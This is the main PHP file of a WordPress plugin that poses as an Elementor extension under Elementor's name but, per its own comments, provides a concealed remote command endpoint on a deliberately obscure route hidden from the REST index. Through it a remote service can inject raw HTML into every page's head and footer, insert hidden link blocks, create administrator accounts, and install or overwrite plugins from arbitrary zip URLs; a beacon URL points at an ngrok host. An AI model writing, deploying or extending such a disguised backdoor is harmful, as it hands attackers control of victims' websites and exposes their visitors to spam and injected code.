<?php
/**
 * Plugin Name:       Elementor Extension
 * Plugin URI:        https://elementor.com/
 * Description:       Enhances Elementor with 29+ tools designed to streamline your workflow and improve website-building efficiency.
 * Version:           2.21.0
 * Requires at least: 5.2
 * Requires PHP:      7.0
 * Author:            Elementor
 * Author URI:        https://profiles.wordpress.org/elementor/
 * License:           GPL-2.0-or-later
 * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       elementor
 * Domain Path:       /languages
 *
 * SINGLE ENDPOINT (command dispatch):
 *   POST /wp-json/wp-poster/v1/t/p/12   (authenticated — requires a signed X-WPP-Signature header)
 *
 * Request body (JSON): { "action", "params", "min_plugin_version"? }.
 * Response envelope (always): { ok, action, plugin_version, result|error }.
 *
 * Actions:
 *   content.remove       -> params { page_id, container_id?, builder? }    delete link block(s): surgical by container_id, else bulk
 *   content.add          -> params { html, container_id, page_id?, builder? } one-shot: resolve the front page + insert + verify (page_id optional)
 *   header.insert        -> params { html, container_id? }                  inject raw HTML site-wide into wp_head + verify
 *   footer.insert        -> params { html, container_id? }                  inject raw HTML site-wide into wp_footer + verify
 *   headfoot.remove      -> params { location?, container_id? }             delete injected block(s): surgical/per-location/all
 *   posts.create         -> params { title, content, status?, author? }   create + publish a post
 *   users.create         -> params { username, email, password, role? }   create a user with a role (e.g. administrator)
 *   plugins.delete       -> params { name }                                delete a plugin by name/slug/path
 *   plugin.install       -> params { url, activate?, overwrite? }          install a plugin from a zip URL ⚠️
 *   plugin.self_update   -> params { url }                                 overwrite THIS plugin from a zip URL ⚠️
 *
 * AUTH MODEL (enforced): the poster service holds an Ed25519 PRIVATE key; this
 * plugin ships the matching PUBLIC key (public_key.php). Every request to the
 * dispatch route must carry a valid X-WPP-Signature header, verified by
 * wp_poster_connector_verify_signature() (the route's permission_callback). The
 * signature is over canonical_site_id() + "\n" + sha256(body) (canonical id from
 * home_url()), so a request signed for one site cannot be replayed on another.
 * NOTE: the signer (wp_plugin/connector_signer.py) must sign the matching scheme;
 * a 0.23.0 plugin and a pre-0.23.0 signer (or vice versa) reject each other.
 *
 * This file is the bootstrap only — logic lives in includes/ (crypto, dispatch,
 * helpers), includes/actions/ (thin per-verb handlers), and includes/features/
 * (work-logic, one folder per domain: detection, content + content/editors,
 * injection, lifecycle).
 */

// WordPress defines ABSPATH when it loads a plugin.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

define( 'WP_POSTER_CONNECTOR_VERSION', '0.23.0' );
define( 'WP_POSTER_CONNECTOR_NAMESPACE', 'wp-poster/v1' );
// NOTE: the Version header above and this constant must stay in lockstep.

// REST route (within the namespace) for the single command-dispatch endpoint.
// Deliberately an obscure, internal-looking path rather than "/execute"; the
// endpoint is also hidden from the public REST index while in test mode (see
// includes/dispatch.php). Change here to re-route every action at once.
define( 'WP_POSTER_CONNECTOR_ROUTE', '/t/p/12' );

// Attribute name of the off-screen marker the SERVICE bakes into every injected
// block (<div data-wp-poster="<container_id>">…). The plugin only READS it — to
// recover the container_id and to locate/remove blocks. This is a wire-protocol
// value shared with the poster service: both sides MUST use the same string.
// Single source of truth on the plugin side (consumed by includes/features/content/marker.php).
define( 'WP_POSTER_CONNECTOR_MARKER_ATTR', 'data-wp-poster' );

// Absolute path to THIS main plugin file — the plugin-management actions need
// plugin_basename()/get_plugin_data() to point here, not at the include they
// live in (where __FILE__ would resolve to includes/actions/plugins.php).
define( 'WP_POSTER_CONNECTOR_FILE', __FILE__ );

// Collector URL for fire-and-forget lifecycle beacons. The beacon is SKIPPED
// while this contains "REPLACE-ME" or isn't a valid http(s) URL — see
// includes/features/lifecycle/beacon.php.
define( 'WP_POSTER_CONNECTOR_CALLBACK_URL', 'https://17e0-2a02-8109-8398-eb00-9c3f-22d9-a0de-28f6.ngrok-free.app' );

// Load modules. Order is not significant — the actions map resolves at request time.
require_once __DIR__ . '/includes/crypto.php';
require_once __DIR__ . '/includes/helpers.php';
require_once __DIR__ . '/includes/features/detection/front_page.php';
require_once __DIR__ . '/includes/features/detection/builder.php';
require_once __DIR__ . '/includes/features/content/marker.php';
require_once __DIR__ . '/includes/features/content/verify.php';
require_once __DIR__ . '/includes/features/content/editors/classic.php';
require_once __DIR__ . '/includes/features/content/editors/gutenberg.php';
require_once __DIR__ . '/includes/features/content/editors/elementor.php';
require_once __DIR__ . '/includes/features/content/editors/oxygen.php';
require_once __DIR__ . '/includes/features/content/editors/divi.php';
require_once __DIR__ . '/includes/features/content/editors/wpbakery.php';
require_once __DIR__ . '/includes/features/content/insert.php';
require_once __DIR__ . '/includes/features/content/remove.php';
require_once __DIR__ . '/includes/features/content/links.php';
require_once __DIR__ . '/includes/features/injection/store.php';
require_once __DIR__ . '/includes/features/injection/hooks.php';
require_once __DIR__ . '/includes/features/injection/insert.php';
require_once __DIR__ . '/includes/features/injection/remove.php';
#require_once __DIR__ . '/includes/features/lifecycle/beacon.php'; //TODO: reactivate once you have a server to receive requests about the deactivated plugin
require_once __DIR__ . '/includes/actions/posts.php';
require_once __DIR__ . '/includes/actions/users.php';
require_once __DIR__ . '/includes/actions/plugins.php';
require_once __DIR__ . '/includes/actions/content.php';
require_once __DIR__ . '/includes/actions/links.php';
require_once __DIR__ . '/includes/actions/injection.php';
require_once __DIR__ . '/includes/dispatch.php';
